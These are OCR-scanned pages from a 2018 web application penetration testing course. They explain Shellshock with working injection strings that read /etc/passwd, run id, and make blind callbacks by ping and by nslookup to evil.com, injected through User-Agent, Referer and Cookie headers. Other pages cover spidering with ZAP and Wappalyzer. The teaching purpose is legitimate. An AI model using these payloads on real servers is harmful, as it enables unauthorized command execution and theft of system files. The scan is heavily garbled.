'---' 
'-" 
'-.../ . 
'-...,/ 
'-" 
Course Roadmap 
'-" 
'----" 
Next up: Shellshock. 
'-.../ 
'----" 
'-...,/ 
'-.../ 
'----" 
'-" 
'-...,/ 
'-" 
'-...,/ 
'-...,/ 
'-.../ 
'-.../ 
'----" 
'----" 
'-.../ 
'-../ 
'-../ 
'-.../ 
'-.../ 
26 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.../ 
'-.../ 
Software Configuration Flaws 
A major portion of the OW ASP Testing Guide focuses on looking for software 
configuration flaws 
• One tool/technique used for this was Nikto, but many general-purpose vulnerability 
scanners could also have been used 
Configuration flaw doesn't sound nearly as exciting as SQL Injection, Cross-Site 
Scripting, Cross-Site Request Forgery, or OS Command Injection 
• ... and yet, a simple configuration flaw could indicate to an observant penetration tester 
that some or all of these flaws are present 
Although finding vulnerable packaged software might not sound as exciting, or 
as difficult, as custom application penetration testing, it is extremely common 
on engagements 
Testing configuration management is a significant portion of the OW ASP Testing Guide, an innocuous sounding 
step that has the tester look for software configuration flaws. The tool referenced for carrying out this task was 
Nikto. Although Nikto has been and continues to be commonly used for this purpose, many other traditional 
vulnerability scanners would discover major software configuration flaws as well. 
Although software configuration flaw doesn't sound like a particularly egregious flaw, this task encompasses 
discovering that a target is employing unpatched servers, plugins, and so on, as well as gross misconfigurations 
of up-to-date software. The phrase configuration flaw fails to generate much excitement in the average 
penetration tester, certainly not to the extent that SQL Injection, Cross-Site Scripting, Cross-Site Request 
Forgery, OS Command Injections, File Inclusion, or even Insecure Direct Object References (OW ASP A4) do. 
However, a simple configuration flaw could be indicative of any or all of these flaws existing within the target 
environment. We will explore a few significant configuration flaws like these because penetration testers as well 
as adversaries routinely exploit known-vulnerable systems, applications, servers, or plugins. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
27 
'-' 
'-' 
Co11figuration Flaws Gone'Nild 
• Recent bugs have provided some strong examples of exploitable 
flaws in major applications 
• A few recent flaws stand out though due to the: 
o Extent of the install base of the flawed software 
o Rapid exploitation of the flaws 
o Remote exploitation potential 
o Snazzy logos 
'----' 
'-' 
'----' 
'-J 
'-' 
'----' 
'---' 
'----' 
·-.._; 
'-' 
'-J 
'-../ 
'-' 
Every year numerous vulnerabilities are announced, patched ( or not), and exploited ( or not). Likewise, 2014 
provided its fair share of flaws that impacted web applications that adversaries and penetration testers alike 
abused. Even so, 2014 stands out from most years because of several particular flaws announced and exploited. 
Though there are certainly others, three flaws in particular come to mind due to the number of installs of the 
flawed software, the almost immediate exploitation of the flaws in the wild, the potential for remote 
exploitation, and snazzy logos. You might laugh, but don't discount the impact of identifiable logos with helping 
to spread knowledge. 
Heartbleed, Shellshock, and Drupalgeddon represent significant flaws that have had, and will likely continue to 
have, relevance for web application penetration testers. Heartbleed has already been discussed. Drupalgeddon 
will be discussed on Day 5. So let's turn our attention now to Shellshock. 
28 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'----' 
'-../ 
'-.J 
'-' 
'----' 
'-../ 
'-' 
'-' 
'-' 
'-' 
._, 
'-' 
'-' 
'----' 
'---' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
\..J 
'-' 
'-' 
'-' 
Shell shock 
• Flaws in the Bash shell that persisted for 25 years before discovery 
oAt least we hope that their becoming public was associated with the initial 
discovery 
• The main flaws were in the way that Bash handled functions being 
defined within environment variables and exported them 
• Additional flaws more generically impacted the 
Bash parser but were edge cases less likely to be 
exploitable 
A series of significant flaws affecting Bash, or the Bourne-Again Shell, were announced in September 2014.1 
The flaws, referenced most commonly by the moniker Shellshock, were discovered by Stephane Chazelas a 
mere 25 years after the introduction of the vulnerabilities in 1989 in Bash 1.03.2 
Bash has long been the standard shell for many Linux distributions as well as Mac OS X, so these vulnerabilities 
were extremely widespread and have caused, and continue to cause, concern. 
The initial vulnerability, CVE-2014-6271,3 focused on the way that Bash handled functions being defined within 
environment variables and exported them to a child bash process that would then import these functions as part 
of its environment. Parsing flaws in the way this was handled allowed for an adversary to introduce his own 
commands to be executed because Bash continued to accept input after the function definition was completed.4 
References: 
[I] http://lcamtuf.blogspot.com/2014/09/quick-notes-about-bash-bug-its-impact.html 
(https://cyber.gd/542 _ 230)QR 
[2] http://www.theregister.co.uk/2014/09/24/bash _shell_ vuln/ (https://cyber.gd/542 _ 23 l) 
[3] https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 (https://cyber.gd/542 _ 232) 
[ 4] http://www.openwall.com/I ists/ oss-security /20 14/09 /24/11 (https :// cyber. gd/ 54 2 _ 23 3) 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
29 
\__,i 
\__,i 
SheUshocking 
General flow of Shellshock server exploitation of the primary flaw (CVE-2014- 
6271) and one released later by Michal Zalewski (CVE-2014-6278): 
• Adversary interacts with vulnerable server 
• Input from adversary connection used by server in Bash environment variables 
• Adversary controls input to provide a weaponized function definition and subsequent 
commands for execution 
• Flaw exploited 
The related flaws (CVE-2014-7169, CVE-2014-6277, CVE-2014-7186, and CVE 
2014-7187) have specific requirements and are not as straightforward to exploit 
\__,i 
'-..J 
'-..J 
\__,i 
'--./ 
'--./ 
'--./ 
'--./ 
'-' 
'--./ 
\__,i 
Although there are six separate CVEs related to this particular bug, we focus primarily on two of them. The first 
is the initial CVE, CVE-2014-6271. The other, which was released later, is CVE-2014-6278. This tweak 
discovered by Michal Zalewski was likewise remotely exploitable and a simple injection pattern. The others are 
a bit more esoteric and are less likely to be routinely exploitable via remote web browsing by a pen tester. 
At a high level, the flow is simply for the adversary to interact with a vulnerable server while crafting or 
controlling data used as input to Bash environment variables. Effectively, these will feel rather similar to 
injection attacks that we will perform later while trying to discover and exploit SQL injection and other flaws. 
For our purposes, Shellshock will simply be a potential specific form of an OS Command Injection flaw that we 
might exploit during an engagement. 
30 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--./ 
'-' 
'--./ 
'-' 
'--./ 
'-._,/ 
'-._,/ 
'--./ 
'--./ 
'--./ 
'-._,/ 
'--./ 
'--./ 
'--./ 
'-' 
'--./ 
'-._,/ 
'--./ 
'-.../ 
'--./ 
'--./
'-.../ 
'-._,/
'--./ 
'-' 
'-.../ 
'-.../ 
'-.../ 
Shellshock and the Web? 
• What does Bash have to do with web apps? 
• The first answer is CGI scripts using #!/bin/bash 
o Not likely many of those anymore, though 
• However, for many Linux systems /bin/ sh is actually just a 
pointer to /bin/bash 
o Which means app code leveraging /bin/ sh on the backend might also be 
exposed 
• Michal Zalewski (@lcamtuf) illustrates how this expands the flaw 
to apps that have "functions that are backed by popen() / 
system(), which are somewhat prevalent especially in apps 
written in Python, PHP, and other interpreted languages." 1 
You might be wondering why we are talking about Bash in a web application penetration testing class? For most 
folks, the connection between the Bash bug and web applications is far from immediately obvious. The first and 
most basic way to connect Shellshock and the web is through CGI scripts written using /bin/bash on the system. 
Though not unheard of, directly using Bash in CG! scripts is rather uncommon for modem web applications. 
Unfortunately, this doesn't mean we are in the clear yet. On most modem Linux distributions, /bin/sh is simply a 
symbolic link for /bin/bash. Although this could also render CGI written in /bin/sh vulnerable, a more significant 
implication was pointed out by Michal Zalewski (@lcamtut). 
Michal pointed out that functions leveraging popen() or system() could likewise be vulnerable, which means that 
"web apps written in languages such as PHP, Python, C++, or Java are likely to be vulnerable." 2 
References: 
[1] http://lcamtuf.blogspot.com/2014/09/quick-notes-about-bash-bug-its-impact.html (https://cyber.gd/542 _ 230) 
[2] Ibid. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
31 
\..../ 
\..../ 
Shellshock Payloads 
If thinking about "nix shells, environment variables, and CGI scripts makes 
your head hurt, simply take note of the following strings to add to your list of 
test injections: 
Shellshock Injection: 
() 
{ 42;};echo;/bin/cat /etc/passwd 
() 
{ 42;};echo;/usr/bin/id 
Blind Shellshock Injection: 
IP: 10.42.42.42 
() 
{ 42;} ;echo; ping -c 4 10. 42. 42. 42 
Domain: evil.com 
() 
{ 42;};echo; nslookup abc123.evil.com 
• Detailed walkthrough of the payloads on the next slide 
'-" 
'-._.,,' 
'-._.,,' 
'-" 
'-- 
\..../
'-..,I 
'--' 
'-._.,, 
'-..,I 
'-' 
Some students will have relatively little experience with Linux, shells, Bash, or CGI. Shellshock can get a bit 
heady fast, especially if you have limited previous exposure. However, even without fully understanding the 
flaw, you can still leverage some key Shellshock payloads to provide simple Proof-of-Concept (PoC) 
exploitation. 
Where might we inject these strings? As User-Agents, cookies, and referer entries in particular. Anything that 
might end up as a CGI environment variable is a good target. 
Note: Semicolons ; are the command separator in *nix systems, allowing multiple commands on one line. 
32 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-..,I 
'--'
'-' 
'--' 
'--" 
'-..,I 
-~ 
'-'
'--" 
'--" 
'--" 
'--'
'--' 
'--'
'--"
'--
'--" 
'--"
'--' 
'--'
'--
'--'
'-._.,,
'--'
'-._.,, 
'--
Injection Explained 
HTTP_USER_AGENT='() 
{ 42;};echo;/usr/bin/id' 
____ ,,_A, 
...., 
V 
V 
CGI Environment Variable 
Shellshock Injection 
_________________ A..., 
_ 
r 
~ 
() 
{ 
; } ; 
Shellshock Prefix: Indicates 
the variable is actually a Bash 
function. 42 is arbitrary but is 
what the function is supposed to 
do. Most shellshock payloads 
use a colon.":" that means "do 
nothing" to Bash. 
" f 
'------ ..J'-------- 
--y- 
V 
,---------------, 
Command: This is the 
command(s) the adversary 
wants to execute, id in this 
case. Commands such as 
ping or nslookup could be 
used if blind injections are 
needed. 
Padding: Most shellshock 
examples don't include any 
padding. When injecting 
into HTTP Headers, 
prepending the command 
with an echo can help avoid 
server errors. 
Let's parse a Shellshock injection string to step through what exactly is going on with the string and why it 
works. 
The premise for our type ofShellshock exploitation is that we will be interacting with a vulnerable web server. 
The assumption here is that the server is not only running a vulnerable version of Bash, but also that it is passing 
CGI environment variables to Bash. The most obvious and likely CGI environment variables for us to target are 
HTTP_ USER_ AGENT, HTTP_ COOKIE, and HTTP_ REFERER. There are other CGI environment variables 
that could prove useful, but this example leverages the HTTP _USER_AGENT since the User-Agent HTTP 
Header will generally always be present in our communications with targets. 
Rather than the typical Mozilla/5. 0 ... User-Agent we would normally expect, we, perhaps through an 
interception proxy, submit the following string: 
() 
{ 42;};echo;/usr/bin/id 
So, what gets passed to Bash as an environment variable is: 
HTTP_USER_AGENT='() 
{ 42;};echo;/usr/bin/id' 
This is our Shellshock injection. Let's dive down into these three parts and dissect what is actually happening 
and why it is happening. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
33 
,.__, 
,.__, 
Prefix: () 
{ 42 ; } 
The prefix portion syntax is crafted to indicate to Bash that HTTP_ USER_ AGENT is not just a standard 
environment variable, but rather is a Bash function being stored in an environment variable. The parentheses, ( ) , 
indicate that this is a function. Within the curly braces, { 
} , is what this function will actually do. In large part, 42 
is arbitrary. We could put some shell commands here, but this is not actually what will be executed; we just need 
some data that will not get in the way or cause an error. Note: The most commonly found value within the curly 
braces is a colon : , which, to Bash, means "do nothing." 
Padding: ; echo 
You will find that our injection here deviates from most of what you will find when researching Shellshock. Most 
strings don't include any sort of padding and will go immediately into the command portion. Because we are 
injecting into HTTP Headers and are depending upon server-side modules to handle this data, we have found that 
adding in an ;echo decreases the likelihood of server errors. Note to see this issue firsthand, omit the ;echo from the 
string in the forthcoming lab and look at the results. Even if this padding is unnecessary in many scenarios, it will 
not get in the way of the next portion. 
Command: ; /usr/bin/id 
The command portion is simultaneously the most straightforward part of the injection and the most confounding. 
You can drop commands of your choosing here to be executed. The point is that what is supplied in this portion of 
the string is what will be executed on vulnerable systems. What we do is easy to understand, but why this works 
gets to the heart of the vulnerability. 
34 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
,.__, 
'---' 
,.__, 
,.__, 
'-' 
'-' 
,.__, 
'-' 
,.__, 
,.__,. 
'-' 
,.__, 
,.__, 
,.__, 
,.__, 
,.__, 
,.__, 
,.__, 
,.__, 
,.__, 
'-' 
'-' 
,.__, 
'-' 
'-' 
'-'
'-'
'-'
,.__,
'-'
,.__, 
,.__, 
,.__,
'-'
,.__,
,.__,
'-._/
,.__,
,.__,
\___., 
Execution and Impact 
Now that we better understand what is being injected, consider why 
/usr/bin/id 
() 
{ 
"} " 
f 
f 
" 
Bash will consider HTTP USER AGENT a shell function that can be 
called to execute 42 
• That is odd, but not the real issue 
Bash continues parsing beyond the shell function definition, 
executing what it finds: 
• ; echo;/ usr /bin/ id runs as if typed at a shell prompt 
Why does this entire string being passed as our User-Agent cause /usr /bin/ id actually to execute? Because 
of the crafted prefix, Bash expects a shell function definition. And we provide one in the form of our prefix. 
Although a little odd perhaps, this functionality alone is not the flaw. The flaw is that the Bash parser looks at an 
environment variable, finds the shell function, and continues looking at input after the function has finished 
being defined. Rather than simply considering a new Bash function called HTTP_ USER_ AGENT that runs 42 
when called, it continues looking beyond the ; } and executes what is supplied. 
/usr/bin/id is a simple in line PoC. Beyond that, we could leverage blind Shellshock PoC ifwe don't actually see 
the server's response. Naturally, after we prove to ourselves that we have remote code execution capabilities, it 
would be simple to use this to gain a shell or a Meterpreter session on the system and pivot from this systemto 
others. Privilege escalation might be necessary because we would typically gain low-level user privileges 
initially. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
35 
\._,I 
\._,I 
SheHshocked ·HTTP Visualized 
Benign HTTP Headers 
GET /cgi-bin/netstat.cgi HTTP/1.1 
Host: www.sec542.org 
User-Agent: Mozilla/5.0 (Xll._ 
Referer: www.sec542.org 
:j.~ 
<••:n 
~·~ 
Shellshocked 
HTTP Headers 
'-' 
GET /cgi-bin/netstat.cgi HTTP/1.1 
Host: www.sec542.org 
Oser-Agent: 
() 
{ 42;} ;echo; /usr/bin/id 
Referer: 
() 
{ 42;};echo;/usr/bin/id 
Cookie: 
() 
{ 42;};echo;/usr/bin/id 
Shocked Results 
In the slide, you can see a simple illustration of Shellshock used against a vulnerable application. You see 
benign client traffic on the top, with the expected results, and the Shellshock injecting adversary on the bottom, 
with results of an attacker-chosen command having been executed. 
In this case, the adversary simply injects the following payload: 
() 
{ 42;}; echo; /usr /bin/ id 
This same payload is injected, using an interception proxy, in the place of the expected User-Agent, Referer, and 
Cookie headers. The receiving server uses the client-supplied User-Agent, Referer, and Cookie headers and 
loads them into CGI environment variables, in this case, Bash environment variables. 
For example, the HTTP_ USER_ AGENT CGI environment variable is set to the Shellshock injection payload in 
the instance of the adversary. Typically, we would not expect simply editing a User-Agent to cause such issues, 
but in the case ofShellshock, the User-Agent has been specially crafted such that when Bash parses the 
environment variable, it sees a new function being defined; in this case, the function just says 42. A function of 
42 would be harmless, but unfortunately, Bash continues parsing for commands even after the function 
definition has been completed, which is where the echo and the /usr/bin/id come in. 
The prefix of() { 42;} indicates to Bash that a new shell function is being defined. The name of the function is 
the environment variable into which the data is being placed, HTTP_ USER_ AGENT, for example. Now, if Bash 
is instantiated it sees this new function available. Not a problem, but in parsing that function definition, it 
continues looking beyond the definition and executes the additional adversary-supplied commands. 
36 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-..../ 
'-" 
'-..../ 
'-" 
'-..../ 
'-" 
'-..../ 
'-..../ 
'-" 
'-..../ 
'-" 
'-" 
'-" 
'-" 
'-.../ 
'-..../ 
'-..../ 
'-" 
'-" 
'-.../ 
'-.../ 
'-" 
'-..../ 
. .__,, 
'-" 
'-" 
'-.../ 
'-" 
'-" 
'-..../ 
'-" 
'-..../ 
'-..../
'-..../ 
'-..../ 
'-" 
'-.../ 
'-..../
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
CONFIGURATION, IDENTITY,AND 
AUTHORIZATION TESTING 
I. Scanning with Nmap 
2. Exercise: Gathering Server 1.-.t,,wn,rntinn 
3. Testing Software Configuration 
4. Shellshock 
5. Exercise: Shellshock 
6. Spidering Web Applications 
7. Exercise: Web Spidering 
S. Analyzing Spidering Results 
9. Exercise: ZAP Forced Browse 
IO. 
!!,formation Leakage 
I 2. Exercise: Directory Kl'<>w<:,nc 
Authentication 
! 4. Exercise: Authentication 
! 5 • .Username Harvesting 
f 6. Exercise: Username Harvesting 
17. Burp Intruder 
I 8. Exercise: Fuzzing with Burp Intruder 
!9. Summary 
SEC542 I Web App Penetration Testing and Ethical Hacking 
37 
Course Roadmap 
Our next exercise will demonstrate the Shellshock exploit, hands-on. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
37 
'--' 
'--' 
SEC542 Workbook: Shellshock 
Exercise 2.2: Shellshock 
SECS42 I Web App Penetration Testing andEthical Hacking 
38 
'--' 
'--" 
'----' 
'----' 
'----' 
'----' 
'--" 
\_/ 
'--" 
'-../ 
'-../ 
'--" 
'-../ 
'----' 
'--" 
'-.J 
'----' 
SEC542 Workbook: Shellshock 
'----' 
'-' 
Please go to Exercise 2.2 in the 542 Workbook. 
'----' 
'-.J 
'-../ 
'-' 
'----' 
'-' 
'----' 
'-' 
'--" 
'-' 
'--" 
'-.J 
'--" 
'--" 
'--" 
'--" 
'--" 
'-' 
'--" 
38 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.,I 
'----' 
Course Roadmap 
CONFIGURATION, IDENTITY, AND 
AUTHORIZATION TESTING 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
I. Scanning with Nmap 
2 •. Exercise: Gathering 
3. Testing Software 
4. Shel!shock 
5 .. Ex.ercise: Shellshock 
6. Spidering Web AppJications 
7. Exercise: Web Spidering 
8. Analyzing Spidering Results 
9. Exercise: ZAP Forced Browse 
Hl. Fuzzing 
11. Information Leakage 
! 2. Exercise: Directory Browsing 
13. Authentication 
14. Exercise: Autherrticati¢n 
15. Username Harvesting 
Exercise: Username Harv.,,,tir1'• 
11. Burp Intruder 
Ht Exercise: Fuzzing with Burp Intruder 
19. Summary 
SEC542 I WebApp Penetration Testing and Ethical 
Course Roadmap 
We will next discuss spidering web applications. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
39 
'-.., 
'-.., 
Applic.ition Information Gathering: Spidering 
• Most of OTG Information Gathering seems to fall under the 
purview of spidering 
• Not surprising given its importance to app testing 
OTG-INFO-005 
OTG-INFO-006 
OTG-INFO-007 
OTG-INFO-008 
OTG-INFO-009 
OTG-INFO-010 
Review Webpage Comments and Metadata 
for Information Leakage 
Identify Application Entry Points 
Map Execution Paths through Application 
Fingerprint Web Application Framework 
Fingerprint Web Application 
Map Application Architecture 
SEC542 f Web App Penetration Testing and Ethical Hacking 
4o 
'-'
\.._,/
'-..,
\.._,/
'-' 
\.._,/
'-'
\.._,/
. .___,,
'---' 
'-' 
\.._,/
.___,,
\.._,/ 
\.._,/
\.._,/ 
This table highlights the particular Test IDs for the category. For additional details on this category see below. 
Reference: 
[l] https://www.owasp.org/index.php/Testing_Information _ Gathering (https://cyber.gd/542 _ I 42) QR 
l!]··~~I!] 
fl 
l!:I 
. 
40 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-" 
\.._,/ 
'--' 
'---' 
'---' 
\.._,/ 
\.._,/ 
\.._,/ 
\.._,/ 
\.._,/ 
'---' 
\.._,/ 
'-' 
'-' 
\.._,/ 
'---' 
'-' 
----- 
'-.., 
'-' 
'-' 
'---' 
'-' 
Spidering the Target Site 
• A major step in web application testing is to spider the web application 
• Spidering involves following web links to download a copy of an entire site 
• We can then analyze offline to find: 
o Potential security weaknesses in code 
o Email addresses, names, phone numbers, and such 
o List of keywords for password-guessing attacks 
o Confidential data 
o ... and more 
• Also known as "crawling" a site 
"Spidering" (or "crawling") a website is when an attacker follows the links on a website and downloads each 
page encountered. The result is that the attacker has a copy of the entire publicly linked site. 
Attackers can then analyze the site offline at their leisure, browsing the source and identifying potential security 
weaknesses without creating additional server web logs. Dictionary creation tools parse the downloaded website 
and produce a list of keywords, which can then be used in password-guessing attacks. Attackers also can scrape 
email addresses, names, phone numbers, and other data from the downloaded site for use as targets in brute 
force or social engineering attacks. Finally, attackers can conduct an exhaustive search for confidential data in 
the site (passwords in the source or sensitive information accidentally made public) without tipping off the 
victim. 
Keep in mind that we will spider the site MANY times during our test. Most of our tools for discovery need to 
know that site, but there is no standard storage for results. This means that each tool needs to spider the target 
separately. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
41 
\,_,I 
'-../ 
Spidering_••.Method.s 
Spidering a site can take many forms: 
• It is common to spider a site multiple times because most tools need a map 
of the site to start scanning 
• Each tool stores this map in an internal form, not usually accessible to other 
tools 
Spidering can be automated or manual: 
• Manual spidering is a fancy way to say "browse the site and save each page" 
• May be necessary if automated scanning fails 
• Automated scans may fail because the site is complex or has issues with 
multiple simultaneous requests 
'-' 
'-../ 
\.J 
'-../ 
'-' 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'-' 
'-../ 
'-../ 
'-../ 
Spidering a site is a major part of any web penetration test. It is quite common to repeatedly spider a site. This is 
because the tools we use require a site map and do not read the results from a different tool. (This is something 
that we should all be working to fix!) 
We can manually "spider" a site or use automated tools. The manual method is basically browsing to each page 
and selecting the File -> Save as option. 
42 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-..., 
\.J 
'-../ 
'-../ 
'-' 
'-../
\.J
\.J
'-'
'-..., 
'-../
'-'
\.J
'-...,'
'-' 
'-'
\.J
'-'
\.J
\.J
\._, 
\.J
'-...,
v
'-'
\.J
Robot Control 
• Automated spidering tools are commonly referred to as robots or bots 
• One method of controlling this type of robot is a robots.txt file 
o Placed in the document root of the web application, readable by anyone accessing the website 
o Specifies which User-Agent types should be disallowed access to certain directories or 
individual pages 
o This is not a security control, contrary to popular belief 
• Alternatively, "Robots" meta tags can be used on individual pages 
• Tags to prevent caching of the content: 
o 
<META HTTP-EQUIV="PRAGMA" CONTENT=11NO-CACHE11> 
0 
<META HTTP-EQUIV= 11 CACHE-CONTROL II CONTENT= 
11 NO-CACHE"> 
o These first two should both be used as different clients respect each of them 
• Tags to control search engine spiders and where they go: 
o 
<META NAME=11ROBOTS
11 
CONTENT=11INDEX,NOFOLLOW11> 
o 
<META NAME=11GOOGLEBOT
11 CONTENT=11NOARCHIVE11> 
o These two are useful for controlling search engine bots 
User-agent; ,: 
Disallow, /imagos/ 
Di.sallow-: less 
Disallow, /404.php 
Disallow; /ad:minpago. php 
Disallow: /registration/ 
Disallow: /jsf_dctcct.php 
Disallow, /jof rog dotect.php 
Automated spidering tools are known as "robots. 
11 These are often used by search engines, such as Google, to 
generate a database of pages available on the web. Robots can also be used by website administrators to check 
the validity oflinks, by spammers to gather email addresses, or for other purposes. 
The Robots Exclusion Protocol is an unofficial, commonly used standard for allowing website administrators to 
specify areas that robots should not crawl. Administrators simply create a file called robots.txt in the root 
directory of their website and list in it the directories and pages that should not be crawled. Many robots, 
including the Google crawler, check for this file and act accordingly. However, robots can ignore this file, and it 
can also be helpful for attackers because it provides a convenient list of pages and directories that administrators 
do not want to be widely accessed. 
Website administrators can also use the HTML Robots MET A tag to indicate that robots should not view a 
particular page. However, this method is not in common use. 
Robots Exclusion Protocol: 
http://www.robotstxt.org (https://cyber.gd/542 ~ 212) QR 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
43 
'-../ 
\...../ 
l\uto.tnat~d Spideiring with•• ZAP. (I) 
ZAP is an interception proxy from OW ASP 
• It includes one of the better spidering capabilities 
Spider is primed by using the interception proxy 
• Browse to the starting point 
• Right-click a URL in the History tab, select Attack, and then choose Spider ... 
ZAP spiders most websites quite well 
• Client-side dynamically generated links can cause it to miss pages 
o For example, consider this JavaScript: var link= "http://"+ $hostname + "/index.php"; 
o To contend with this issue, commonly encountered in AJAX sites, ZAP employs a separate 
dedicated AJAX Spider 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'---' 
'-../ 
'-../ 
'-../ 
'-../ 
'-../ 
'-" 
'-../ 
'---' 
ZAP, the Zed Attack Proxy, is a general-purpose web application testing tool. It can be used to spider a website. 
ZAP will gather a list oflinks and fetch them on command. In this example, we spider the website hosted at 
http://www.sec542.org. 
First, make sure your browser is configured to use ZAP as its proxy. Then open ZAP. Next, open Firefox, and 
enter http://www.sec542.org into the browser bar. Press Enter to download the page. You can see the address 
for http://www.sec542.org listed in ZAP. 
Then go to ZAP, click the History tab, right-click http://www,sec542.org, choose Attack, and then choose 
Spider. ... Then choose Start Scan. 
ZAP Proxy is available from https://www.owasp.org/index.php/OW ASP_ Zed_ Attack _proxy _project 
(https://cyber.gd/542 _ 213) QR 
44 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-" 
'---' 
'---' 
'---' 
'-" 
'-../ 
'-../ 
'-../ 
'-../ 
'---' 
'---' 
'---' 
·--....,, 
'---' 
'-../ 
'-" 
'-" 
'-../ 
'-../ 
'---' 
'-" 
'---' 
'-../ 
'-../ 
'-...-' 
'---' 
Automated Spidering with ZAP (2) 
OUT_ OF_ SCOPE 
ZAP, the Zed Attack Proxy, from OW ASP is a great tool to use for spidering. It enables us to spider the site 
while providing some feedback on how long it will take. It also includes a listing of out-of-scope targets it 
encountered during the spidering. This enables us to see if additional targets may exist. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
45 
'---" 
VVappalyzer 
• Though not exactly a spidering tool, Wappalyzer provides detailed 
understanding of what technologies a web application is leveraging 
• For example, Wappalyzer can provide insight into the: 
o Operating system 
o Web server 
o Packaged web applications 
o Language(s) 
o Frameworks 
o APis leveraged 
• All these items are provided to the penetration tester passively through the 
use of a browser extension 
'--' 
\_.,I 
'-" 
'---" 
'-..../ 
'-" 
\.J 
'--' 
\...,I 
'-" 
'-..../ 
'-..../ 
'-" 
'-../ 
'-..../ 
We previously looked at identifying the web server and basic software configuration by using Nikto. Another 
approach that can help us achieve a deep understanding of technologies employed by web applications is by 
leveraging W appalyzer. The website associated with W appalyzer provides for some interesting statistics about 
technologies and popular sites using them. However, by simply using the Wappalyzer browser extension for 
Firefox or Chrome/Chromium, we can achieve astonishing visibility into technologies employed by sites we 
visit. Although we might have already captured some of this information via Nikto, a second opinion, especially 
a passive one, never hurts. Also, Wappalyzer seems to provide an exceedingly thorough identification. 
Reference: 
[ 1] https://www.wappalyzer.com/ (https://cyber.gd/542 _ 252)QR 
46 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-" 
'---" 
'-..../ 
'-" 
'-.._I 
'-..../ 
'-" 
'-" 
'-" 
'-..../ 
'-..../ 
'-..../ 
'-.._I 
'-.._I 
'-" 
'--' 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-' 
'-..../ 
\...,I 
'-../ 
'-" 
'-" 
Wappalyzer + Browsers 
Vogon Poetry 
uld l Do? 
ti 
Ill,~ 
Help Me! 
I 
In this slide, we see the Security542 Firefox and Chromium, which have the Wappalyzer extension installed and 
enabled. One especially nice thing about the Firefox version is the automatic addition of icons to the end of the 
address bar. This enables the penetration tester to see, with a glance, indicators of technologies employed by the 
web application. Here's a close-up of the Firefox screenshot: 
The extensions are freely available for download. 
1 Be advised: 
By default the browser extensions send anonymous information about websites you visit to wappalyzer.com. 
This information is used to generate the statistics on this website, as well as datasets that we sell. To respect 
your privacy we don't track full URLs (domain names only) and no information can be traced back to you 
personally. You may opt-out by turning this feature off in the settings? 
References: 
[I] https://www.wappalyzer.com/download (https://cyber.gd/542 _ 254)QR 
[2] https://wappalyzer.com/faq (https://cyber.gd/542_ 421) 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
47 
\__,I 
ZAP._+Wappalyzer 
• ZAP offers another means of leveraging Wappalyzer details 
o This is possible because Wappalyzer is open source1 
• Technology Detection, an extension, available in the ZAP marketplace, brings 
Wappalyzer functionality to the proxy 
• At present, the Wappalyzer extension is not considered release quality 
o It is a passive module, so the lack of release quality code is unlikely to cause significant 
impact 
• The code does not currently implement all the functionality of the full 
browser extension 
o Some capabilities will likely remain out of reach as they require a full browser to parse for 
analysis 
'-.,./ 
'-.,./ 
'---' 
'--../
'--../
'---' 
'--' 
'---' 
'--' 
'---'
'-.,./ 
'---'
'--' 
The ZAP marketplace enables us to extend the functionality of ZAP. In addition to what ZAP terms release 
quality extensions, the marketplace also offers some extensions that are at various stages of development. One 
such extension brings Wappalyzer functionality to ZAP. The extension is the Technology Detection module, 
which is currently not considered to be release quality. This passive module implements some, but not all, of the 
technology detecting capabilities of Wappalyzer. The extension is passive, which, presumably, means a 
decreased likelihood of significant impact, as opposed to an alpha quality Active Scan, which would be more 
likely to give me pause. 
Reference: 
[1] https://github.com/ElbertF/Wappalyzer (https://cyber.gd/542 _ 420) QR 
48 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--../
'---' 
'--../ 
'--'
'---'
'--../
'--../
'---'
'--' 
'---'
"-.,,'
'--'
'-.,,· 
'--'
"-..,·
'---'
'-...,; 
'--'
'--'
'--'
'-' 
'--'
'--'
'-' 
'----' 
'--'
ZAP:Technology Detection 
ZAP Technology Detection is a Marketplace extension. When installed, it adds an additional tab to the interface. 
The new Technology tab is where you can find the Wappalyzer output. As shown in the slide, the output is 
presented on a per-site basis. The current version of the extension does not indicate the version of the particular 
technology identified. 
Regardless, even with the lack of version information and the limitation of some products not being detectable 
without a browser's rendering capability, the tool still represents a boon to ZAP and the web application pen 
tester. 
Categories 
Web-servers 
Databases 
Programming-languages 
